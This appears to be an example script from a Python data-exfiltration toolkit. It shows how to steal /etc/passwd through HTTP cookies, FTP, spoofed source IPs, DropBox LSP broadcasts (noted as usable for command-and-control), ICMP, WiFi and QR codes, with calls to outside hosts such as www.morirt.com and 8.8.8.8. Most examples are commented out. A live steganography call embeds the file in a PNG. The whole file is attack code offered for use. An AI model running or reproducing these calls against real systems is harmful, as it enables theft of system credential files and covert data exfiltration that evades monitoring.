#!/usr/bin/env python

import sys



FILE_TO_EXFIL = "/etc/passwd"




""" NETWORK EXAMPLES """


""" HTTP Cookies """
# from pyexfil.network.HTTP_Cookies.http_exfiltration import send_file
#
# send_file(addr='http://www.morirt.com', file_path=FILE_TO_EXFIL)


""" Source IP Based  """
# from pyexfil.network.FTP.ftp_exfil import FTPExfiltrator
#
# FTPexf = FTPExfiltrator(file2exfil=FILE_TO_EXFIL, server="8.8.8.8", port=21, creds=(), tls=False)
# FTPexf.get_file_chunks()
# FTPexf.build_final_chunks()
# FTPexf.send_chunks()


""" Source IP Based * """
# from pyexfil.network.SpoofIP.spoofIPs_client import _send
#
# _send(file_path=FILE_TO_EXFIL, to="8.8.8.8")


""" DropBox LSP """
# # Can also be used to CNC communication inside network.
# from pyexfil.network.DB_LSP.dblsp import DB_LSP
#
# dbLSP = DB_LSP(
#                     cnc='192.168.1.255',
#                     data=open(FILE_TO_EXFIL, 'rb').read(),
#                     key="Donnie!"
#                     )
# dbLSP._Create()
# dbLSP.Send()


""" Exfiltration Over ICMP * """
# from pyexfil.network.ICMP.icmp_exfiltration import send_file
#
# send_file(  "8.8.8.8",
#             src_ip_addr="127.0.0.1",
#             file_path=FILE_TO_EXFIL,
#             max_packetsize=512,
#             SLEEP=0.1)


""" STEGANOGRAPHY EXAMPLES """

""" Binary offset in file """
from pyexfil.Stega.binoffset.binoffset import CreateExfiltrationFile

CreateExfiltrationFile(
            originalImage='pyexfil/Stega/binoffset/image.png',
            rawData=FILE_TO_EXFIL,
            OutputImage="/tmp/new.png")




""" PHYSICAL EXAMPLES """


""" Example for Wifi Payload """
# from pyexfil.physical.wifiPayload.client import exfiltrate
#
# exfiltrate(FILE_TO_EXFIL)

""" Example for QRCode Exfiltration """
# from pyexfil.physical.qr.generator import CreateQRs, PlayQRs
# if CreateQRs(FILE_TO_EXFIL):
#     PlayQRs()
# else:
#     sys.stderr.write("Something went wrong with creating QRs.\n")
